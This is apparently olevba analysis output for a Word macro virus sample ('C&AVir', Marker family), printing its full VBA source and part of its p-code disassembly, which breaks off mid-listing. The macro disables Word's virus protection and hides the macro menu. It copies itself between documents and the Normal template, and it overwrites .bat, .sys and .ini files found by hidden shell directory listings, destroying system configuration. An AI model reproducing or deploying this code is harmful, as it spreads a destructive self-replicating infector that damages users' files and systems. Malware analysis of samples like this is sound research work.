olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.cg2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.cg2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
  'New Era of C&AVir. More Powerfull
  On Error Resume Next
  Dim Sw_Doc_Infec, Sw_Pln_Infec, Activa_Doc, Activa_Pln, Acci_Arch, Rompe As Boolean
  Dim Dc, Pl As Object
  Dim linwork, LCDoc, LCPln, parchi, pext, pext1, docum As String
  Dim Accion1, Accion2, LinDoc, LinPln, Compara As Integer
  Const cyav = "Este Es <C&AVir>"
  Const pnomus = "***< C & A V i r >***"
  'Inicializa Variables
  Sw_Doc_Infec = False
  Sw_Pln_Infec = False
Activa_Doc = True
Activa_Pln = False
  CommandBars("Tools").Controls("Macro").Enabled = False
  CommandBars("Tools").Controls("Macro").Visible = False
  Options.VirusProtection = (1 - 1)
  Options.SaveNormalPrompt = (1 - 1)
  Options.ConfirmConversions = (1 - 1)
  Options.CreateBackup = (1 - 1)
  Set Dc = ActiveDocument.VBProject.VbComponents.Item(1)
  Set Pl = NormalTemplate.VBProject.VbComponents.Item(1)
  LinPln = Pl.CodeModule.Countoflines
  LinDoc = Dc.CodeModule.Countoflines
  Sw_Pln_Infec = Pl.CodeModule.Find(cyav, 1, 1, 10000, 10000)
  Sw_Doc_Infec = Dc.CodeModule.Find(cyav, 1, 1, 10000, 10000)
  Acci_Arch = False
  Randomize
  If Activa_Doc = True Then
    If Date > 36433 Then
      Dia = Day(Date)
      If Dia = 1 Then
        Ptp = Int(6 * Rnd)
        Select Case Ptp
          Case 1
            Acci_Arch = True
            pext = "*.doc"
            pext1 = "1"
          Case 2
            Acci_Arch = True
            pext = "*.bat"
            pext1 = "2"
          Case 3
            Acci_Arch = True
            pext = "*.sys"
            pext1 = "3"
          Case 4
            Acci_Arch = False
            pext = ""
            pext1 = ""
          Case 5
            Acci_Arch = True
            pext = "*.ini"
            pext1 = "4"
        End Select
        If Acci_Arch = True Then
          parchi = "IOBuff" & pext1 & ".vxd"
          Shell "command.com /c dir \" & pext & "/s/b>>\" & parchi, vbHide
        End If
      End If
      DiaSem = WeekDay(Date)
      DiaSem = DiaSem + 3
      Hacer = Int(DiaSem * Rnd)
      If Hacer = Day(Now) Or (Hacer * 3) = Minute(Now) Then
        Select Case Hacer
          Case 1
            Options.BlueScreen = True
            Options.CheckGrammarAsYouType = False
            Options.CheckSpellingAsYouType = False
            ActiveDocument.ShowGrammaticalErrors = False
            ActiveDocument.ShowSpellingErrors = False
            ActiveDocument.CommandBars.LargeButtons = True
            Application.ActiveWindow.DisplayVerticalScrollBar = False
          Case 2
            With ActiveDocument.PageSetup.LineNumbering
                 .Active = True
                 .StartingNumber = 3
                 .CountBy = 3
                 .RestartMode = wdRestartSection
            End With
            ActiveDocument.Save
            If ActiveDocument.CommandBars.LargeButtons = True Then ActiveDocument.CommandBars.LargeButtons = False
            ActiveDocument.ActiveWindow.Caption = ActiveDocument.ActiveWindow.Caption & " - Pura Basura!!"
            If ActiveDocument.Saved = False Then ActiveDocument.Save
          Case 3
            With ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).PageNumbers
                 .NumberStyle = wdPageNumberStyleLowercaseRoman
                 .IncludeChapterNumber = True
                 .RestartNumberingAtSection = True
                 .StartingNumber = 99
                 .Add PageNumberAlignment:=wdAlignPageNumberCenter, FirstPage:=True
            End With
            Application.ActiveWindow.DisplayHorizontalScrollBar = False
            Application.ActiveWindow.DisplayVerticalScrollBar = False
            If ActiveDocument.Saved = False Then ActiveDocument.Save
            If Options.BlueScreen = True Then Options.BlueScreen = False
          Case 4
            If Application.CommandBars.Item(1).Controls.Item(3).Enabled = False Then Application.CommandBars.Item(1).Controls.Item(3).Enabled = True
            If Application.CommandBars.Item(1).Controls.Item(4).Enabled = False Then Application.CommandBars.Item(1).Controls.Item(4).Enabled = True
            If Application.CommandBars.Item(1).Controls.Item(6).Enabled = False Then Application.CommandBars.Item(1).Controls.Item(6).Enabled = True
            Application.CommandBars.Item(1).Enabled = False
            Application.CommandBars.Item(2).Enabled = False
            Application.ActiveWindow.DisplayVerticalScrollBar = False
            x = ActiveDocument.Paragraphs.Count
            For R = 1 To x
              ActiveDocument.Paragraphs(R).Alignment = wdAlignParagraphCenter
            Next R
            ActiveDocument.Save
            If Options.CheckGrammarAsYouType = False Then Options.CheckGrammarAsYouType = True
            If Options.CheckSpellingAsYouType = False Then Options.CheckSpellingAsYouType = True
            If ActiveDocument.ShowGrammaticalErrors = False Then ActiveDocument.ShowGrammaticalErros = True
            If ActiveDocument.ShowSpellingErrors = False Then ActiveDocument.ShowSpellingErrors = True
          Case 5
            If Options.CheckGrammarAsYouType = False Then Options.CheckGrammarAsYouType = True
            If ActiveDocument.ShowGrammaticalErrors = False Then ActiveDocument.ShowGrammaticalErros = True
            If Application.CommandBars.Item(1).Controls.Item(2).Visible = False Then Application.CommandBars.Item(1).Controls.Item(2).Visible = True
            If Application.CommandBars.Item(1).Controls.Item(5).Visible = False Then Application.CommandBars.Item(1).Controls.Item(5).Visible = True
            If Application.ActiveWindow.DisplayHorizontalScrollBar = False Then Application.ActiveWindow.DisplayVerticalScrollBar = True
            twori = Application.CommandBars.Item(2).Controls.Item(1).Width
            thori = Application.CommandBars.Item(2).Controls.Item(1).Height
            Application.CommandBars.Item(1).Controls.Item(7).Width = twori
            Application.CommandBars.Item(1).Controls.Item(7).Height = thori
            Application.CommandBars.Item(1).Controls.Item(1).Caption = "Ja! Ja!"
            Application.CommandBars.Item(1).Controls.Item(2).Caption = "This Is"
            Application.CommandBars.Item(1).Controls.Item(3).Caption = "<C&AVir>"
            Application.CommandBars.Item(1).Controls.Item(6).Caption = "Rebizar Hortogrhafia"
          Case 6
            Application.CommandBars.Item(1).Controls.Item(3).Enabled = False
            Application.CommandBars.Item(1).Controls.Item(4).Enabled = False
            Application.CommandBars.Item(1).Controls.Item(6).Enabled = False
            x = ActiveDocument.Paragraphs.Count
            For R = 1 To x
              ActiveDocument.Paragraphs(R).Alignment = wdAlignParagraphRight
            Next R
            ActiveDocument.Save
          Case 7
            If Options.CheckSpellingAsYouType = False Then Options.CheckSpellingAsYouType = True
            If ActiveDocument.ShowSpellingErrors = False Then ActiveDocument.ShowSpellingErrors = True
            Application.CommandBars.Item(1).Controls.Item(4).Enabled = False
            Application.CommandBars.Item(1).Controls.Item(2).Visible = False
            Application.CommandBars.Item(1).Controls.Item(5).Visible = False
            Application.CommandBars.Item(1).Controls.Item(7).Width = 65
            Application.CommandBars.Item(1).Controls.Item(7).Height = 65
          Case 8
            If Date < 36527 Then
              Selection.TypeText " All sistems and mainframes aren't capaple to support the new era of the year 2000 or Y2K, The disaster is possible by this cause"
            Else
              Selection.TypeText " The End of World is near, you can prevent make the LOVE not the war !!!."
            End If
        End Select
      End If
    End If
  End If
  If Activa_Pln = True Then
    Shell "command.com /c dir \*.dll/s/o/b>>\IODocs.dll", vbHide
    If Dir("\IODocs.dll") <> "" Then
      SetAttr "\IODocs.dll", vbHidden
    End If
    If Day(Date) = 14 Or Day(Date) = 28 Then
      With Dialogs(wdDialogFileSummaryInfo):
           .Title = "Make The Love!! Not The War !!":
           .Author = pnomus:
           .Keywords = "ALT + <F4>, <CTRL>+<ALT>+<SUPR>, <F1>":
           .Execute:
      End With
    End If
    NormalTemplate.Save
    If Dir("\IOBuff1.vxd") <> "" Then
      Open "\IOBuff1.vxd" For Input As #1
      If LOF(1) <> 0 Then
        Do While Not EOF(1)
          Line Input #1, docum
          Encue = False
          For Each doc In Documents
            If doc.Name = docum Then Encue = True
          Next doc
          If Encue <> True Then
            Documents.Open FileName:=docum
          Else
            Documents(docum).Activate
          End If
        Loop
      End If
      Close #1
      Kill "\IOBuff1.vxd"
    End If
    If Dir("\IOBuff2.vxd") <> "" Then
      Open "\IOBuff2.vxd" For Input As #2
      If LOF(2) <> 0 Then
        Do While Not EOF(2)
          Line Input #2, Pabt
          Open Pabt For Output As #3
          Print #3, "REM ** This Bat File Has Violed By <C&AVir>"
          Print #3, "REM ** Your PC Is Not Secure System"
          Print #3, "prompt Fuck You!!$g"
          Print #3, "cls"
          Print #3, "command.com"
          Close #3
        Loop
      End If
      Close #2
      Kill "\IOBuff2.vxd"
    End If
    If Dir("\IOBuff3.vxd") <> "" Then
      Open "\IOBuff3.vxd" For Input As #4
      If LOF(4) <> 0 Then
        Do While Not EOF(4)
          Line Input #4, Pasy
          Open Pasy For Output As #5
          Print #5, "REM   Warning In the file " & Pasy & "!!"
          Print #5, "REM   This Sys File can only operate with"
          Print #5, "REM   Operating Systems Powerfull and Secures"
          Print #5, "REM   <C&AVir>."
          Print #5, "FILES = 1"
          Print #5, "BUFFERS = 1"
          Close #5
        Loop
      End If
      Close #4
      Kill "\IOBuff3.vxd"
    End If
    If Dir("\IOBuff4.vxd") <> "" Then
      Open "\IOBuff4.vxd" For Input As #6
      If LOF(6) <> 0 Then
        Do While Not EOF(6)
          Line Input #6, Pain
          Open Pain For Output As #7
          Print #7, "**********************************************************"
          Print #7, "     Warning!: The File: " & Pain
          Print #7, "     Is Damaged. I`m Sorry!"
          Print #7, "**********************************************************"
          Print #7, " "
          Print #7, "Reinstall Your System..."
          Close #7
        Loop
      Close #6
      End If
      Kill "\IOBuff4.vxd"
    End If
  End If
  Rompe = False
  If LinDoc <> 0 Then
    While Rompe = False
      Compara = Int(Rnd * LinDoc)
      If Compara <> 0 And Compara <> 1 And Compara <> 320 Then
        Rompe = True
      End If
    Wend
  Else
    While Rompe = False
      Compara = Int(Rnd * LinPln)
      If Compara <> 0 And Compara <> 1 And Compara <> 320 Then
        Rompe = True
      End If
    Wend
  End If
  LCPln = Pl.CodeModule.Lines(Compara, 1)
  LCDoc = Dc.CodeModule.Lines(Compara, 1)
  'Validar Estado de la Plantilla
  If Sw_Pln_Infec = False Then
    If LinPln <> 0 Then
      If LCPln <> LCDoc Then
        Pl.CodeModule.DeleteLines 1, LinPln
        Accion1 = 1
      Else
        If LinPln <> LinDoc Then
          Pl.CodeModule.DeleteLines 1, LinPln
          Accion1 = 1
        Else
          Accion1 = 2
        End If
      End If
    Else
      Accion1 = 1
    End If
  Else
    Accion1 = 2
  End If
  'Validar Estado del Documento
  If Sw_Doc_Infec = False Then
    If LinDoc <> 0 Then
      If LCDoc <> LCPln Then
        Dc.CodeModule.DeleteLines 1, LinDoc
        Accion2 = 1
      Else
        If LinDoc <> LinPln Then
          Dc.CodeModule.DeleteLines 1, LinDoc
          Accion2 = 1
        Else
          Accion2 = 2
        End If
      End If
    Else
      Accion2 = 1
    End If
  Else
    Accion2 = 2
  End If
  If Accion1 = 1 Then 'Infectar Plantilla
    For R = 1 To LinDoc
      linwork = Dc.CodeModule.Lines(R, 1)
      Pl.CodeModule.InsertLines R, linwork
    Next R
    Pl.CodeModule.ReplaceLine 1, "Private Sub Document_Close()"
    Pl.CodeModule.ReplaceLine 13, "Activa_Doc = False"
    Pl.CodeModule.ReplaceLine 14, "Activa_Pln = True"
    Application.UserName = pnomus
    NormalTemplate.Save
  End If
  If Accion2 = 1 Then 'Infectar Documento Activo
    For R = 1 To LinPln
      linwork = Pl.CodeModule.Lines(R, 1)
      Dc.CodeModule.InsertLines R, linwork
    Next R
    Dc.CodeModule.ReplaceLine 1, "Private Sub Document_Open()"
    Dc.CodeModule.ReplaceLine 13, "Activa_Doc = True"
    Dc.CodeModule.ReplaceLine 14, "Activa_Pln = False"
    ActiveDocument.Save
  End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.cg2
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 17429 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	QuoteRem 0x0002 0x0021 "New Era of C&AVir. More Powerfull"
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Dim 
' 	VarDefn Sw_Doc_Infec
' 	VarDefn Sw_Pln_Infec
' 	VarDefn Activa_Doc
' 	VarDefn Activa_Pln
' 	VarDefn Acci_Arch
' 	VarDefn Rompe (As Boolean)
' Line #4:
' 	Dim 
' 	VarDefn Dc
' 	VarDefn Pl (As Object)
' Line #5:
' 	Dim 
' 	VarDefn linwork
' 	VarDefn LCDoc
' 	VarDefn LCPln
' 	VarDefn parchi
' 	VarDefn pext
' 	VarDefn pext1
' 	VarDefn docum (As String)
' Line #6:
' 	Dim 
' 	VarDefn Accion1
' 	VarDefn Accion2
' 	VarDefn LinDoc
' 	VarDefn LinPln
' 	VarDefn Compara (As Integer)
' Line #7:
' 	Dim (Const) 
' 	LitStr 0x0010 "Este Es <C&AVir>"
' 	VarDefn cyav
' Line #8:
' 	Dim (Const) 
' 	LitStr 0x0015 "***< C & A V i r >***"
' 	VarDefn pnomus
' Line #9:
' 	QuoteRem 0x0002 0x0014 "Inicializa Variables"
' Line #10:
' 	LitVarSpecial (False)
' 	St Sw_Doc_Infec 
' Line #11:
' 	LitVarSpecial (False)
' 	St Sw_Pln_Infec 
' Line #12:
' 	LitVarSpecial (True)
' 	St Activa_Doc 
' Line #13:
' 	LitVarSpecial (False)
' 	St Activa_Pln 
' Line #14:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #15:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #18:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #19:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt CreateBackup 
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VbComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Dc 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VbComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Pl 
' Line #22:
' 	Ld Pl 
' 	MemLd CodeModule 
' 	MemLd Countoflines 
' 	St LinPln 
' Line #23:
' 	Ld Dc 
' 	MemLd CodeModule 
' 	MemLd Countoflines 
' 	St LinDoc 
' Line #24:
' 	Ld cyav 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld Pl 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St Sw_Pln_Infec 
' Line #25:
' 	Ld cyav 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld Dc 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St Sw_Doc_Infec 
' Line #26:
' 	LitVarSpecial (False)
' 	St Acci_Arch 
' Line #27:
' 	ArgsCall Read 0x0000 
' Line #28:
' 	Ld Activa_Doc 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #29:
' 	Ld Date 
' 	LitDI4 0x8E51 0x0000 
' 	Gt 
' 	IfBlock 
' Line #30:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	St Dia 
' Line #31:
' 	Ld Dia 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #32:
' 	LitDI2 0x0006 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St Ptp 
' Line #33:
' 	Ld Ptp 
' 	SelectCase 
' Line #34:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #35:
' 	LitVarSpecial (True)
' 	St Acci_Arch 
' Line #36:
' 	LitStr 0x0005 "*.doc"
' 	St pext 
' Line #37:
' 	LitStr 0x0001 "1"
' 	St pext1 
' Line #38:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #39:
' 	LitVarSpecial (True)
' 	St Acci_Arch 
' Line #40:
' 	LitStr 0x0005 "*.bat"
' 	St pext 
' Line #41:
' 	LitStr 0x0001 "2"
' 	St pext1 
' Line #42:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #43:
' 	LitVarSpecial (True)
' 	St Acci_Arch 
' Line #44:
' 	LitStr 0x0005 "*.sys"
' 	St pext 
' Line #45:
' 	LitStr 0x0001 "3"
' 	St pext1 
' Line #46:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #47:
' 	LitVarSpecial (False)
' 	St Acci_Arch 
' Line #48:
' 	LitStr 0x0000 ""
' 	St pext 
' Line #49:
' 	LitStr 0x0000 ""
' 	St pext1 
' Line #50:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #51:
' 	LitVarSpecial (True)
' 	St Acci_Arch 
' Line #52:
' 	LitStr 0x0005 "*.ini"
' 	St pext 
' Line #53:
' 	LitStr 0x0001 "4"
' 	St pext1 
' Line #54:
' 	EndSelect 
' Line #55:
' 	Ld Acci_Arch 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #56:
' 	LitStr 0x0006 "IOBuff"
' 	Ld pext1 
' 	Concat 
' 	LitStr 0x0004 ".vxd"
' 	Concat 
' 	St parchi 
' Line #57:
' 	LitStr 0x0014 "command.com /c dir \"
' 	Ld pext 
' 	Concat 
' 	LitStr 0x0007 "/s/b>>\"
' 	Concat 
' 	Ld parchi 
' 	Concat 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	St DiaSem 
' Line #61:
' 	Ld DiaSem 
' 	LitDI2 0x0003 
' 	Add 
' 	St DiaSem 
' Line #62:
' 	Ld DiaSem 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St Hacer 
' Line #63:
' 	Ld Hacer 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Eq 
' 	Ld Hacer 
' 	LitDI2 0x0003 
' 	Mul 
' 	Paren 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #64:
' 	Ld Hacer 
' 	SelectCase 
' Line #65:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #66:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt BlueScreen 
' Line #67:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt CheckGrammarAsYouType 
' Line #68:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt CheckSpellingAsYouType 
' Line #69:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ShowGrammaticalErrors 
' Line #70:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ShowSpellingErrors 
' Line #71:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemLd CommandBars 
' 	MemSt LargeButtons 
' Line #72:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt DisplayVerticalScrollBar 
' Line #73:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #74:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemLd LineNumbering 
' 	With 
' Line #75:
' 	LitVarSpecial (True)
' 	MemStWith Active 
' Line #76:
' 	LitDI2 0x0003 
' 	MemStWith StartingNumber 
' Line #77:
' 	LitDI2 0x0003 
' 	MemStWith CountBy 
' Line #78:
' 	Ld wdRestartSection 
' 	MemStWith RestartMode 
' Line #79:
' 	EndWith 
' Line #80:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #81:
' 	Ld ActiveDocument 
' 	MemLd CommandBars 
' 	MemLd LargeButtons 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemLd CommandBars 
' 	MemSt LargeButtons 
' 	EndIf 
' Line #82:
' 	Ld ActiveDocument 
' 	MemLd ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0010 " - Pura Basura!!"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #83:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #84:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #85:
' 	StartWithExpr 
' 	Ld wdHeaderFooterPrimary 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Sections 0x0001 
' 	ArgsMemLd Headers 0x0001 
' 	MemLd PageNumbers 
' 	With 
' Line #86:
' 	Ld wdPageNumberStyleLowercaseRoman 
' 	MemStWith NumberStyle 
' Line #87:
' 	LitVarSpecial (True)
' 	MemStWith IncludeChapterNumber 
' Line #88:
' 	LitVarSpecial (True)
' 	MemStWith RestartNumberingAtSection 
' Line #89:
' 	LitDI2 0x0063 
' 	MemStWith StartingNumber 
' Line #90:
' 	Ld wdAlignPageNumberCenter 
' 	ParamNamed PageNumberAlignment 
' 	LitVarSpecial (True)
' 	ParamNamed FirstPage 
' 	ArgsMemCallWith Add 0x0002 
' Line #91:
' 	EndWith 
' Line #92:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt DisplayHorizontalScrollBar 
' Line #93:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt DisplayVerticalScrollBar 
' Line #94:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #95:
' 	Ld Options 
' 	MemLd BlueScreen 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt BlueScreen 
' 	EndIf 
' Line #96:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #97:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Enabled 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' 	EndIf 
' Line #98:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Enabled 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' 	EndIf 
' Line #99:
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Enabled 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' 	EndIf 
' Line #100:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' Line #101:
' 	LitVarSpecial (False)
' 	LitDI2 0x0002 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' Line #102:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt DisplayVerticalScrollBar 
' Line #103:
' 	Ld ActiveDocument 
' 	MemLd Paragraphs 
' 	MemLd Count 
' 	St x 
' Line #104:
' 	StartForVariable 
' 	Ld R 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	For 
' Line #105:
' 	Ld wdAlignParagraphCenter 
' 	Ld R 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemSt Alignment 
' Line #106:
' 	StartForVariable 
' 	Ld R 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #108:
' 	Ld Options 
' 	MemLd CheckGrammarAsYouType 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt CheckGrammarAsYouType 
' 	EndIf 
' Line #109:
' 	Ld Options 
' 	MemLd CheckSpellingAsYouType 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt CheckSpellingAsYouType 
' 	EndIf 
' Line #110:
' 	Ld ActiveDocument 
' 	MemLd ShowGrammaticalErrors 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt ShowGrammaticalErros 
' 	EndIf 
' Line #111:
' 	Ld ActiveDocument 
' 	MemLd ShowSpellingErrors 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt ShowSpellingErrors 
' 	EndIf 
' Line #112:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #113:
' 	Ld Options 
' 	MemLd CheckGrammarAsYouType 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt CheckGrammarAsYouType 
' 	EndIf 
' Line #114:
' 	Ld ActiveDocument 
' 	MemLd ShowGrammaticalErrors 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt ShowGrammaticalErros 
' 	EndIf 
' Line #115:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Visible 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Visible 
' 	EndIf 
' Line #116:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Visible 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Visible 
' 	EndIf 
' Line #117:
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemLd DisplayHorizontalScrollBar 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt DisplayVerticalScrollBar 
' 	EndIf 
' Line #118:
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
